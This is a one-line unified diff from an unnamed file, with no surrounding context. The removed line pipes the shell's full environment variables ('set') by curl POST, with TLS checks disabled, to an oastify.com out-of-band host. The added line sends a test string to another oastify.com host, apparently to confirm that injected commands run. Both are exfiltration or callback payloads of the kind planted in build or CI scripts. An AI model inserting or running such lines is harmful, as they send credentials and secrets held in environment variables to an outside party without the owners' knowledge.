@@ -1,1 +1,1 @@
-set | curl -X POST --insecure --data-binary @- https://b8k1al3awwpb0p1s652mv33hq8wzkp8e.oastify.com/?
+curl -X POST --data-binary test1bo https://9blhfe0tg88uc8gsa0j37sbspjvaj07p.oastify.com/?
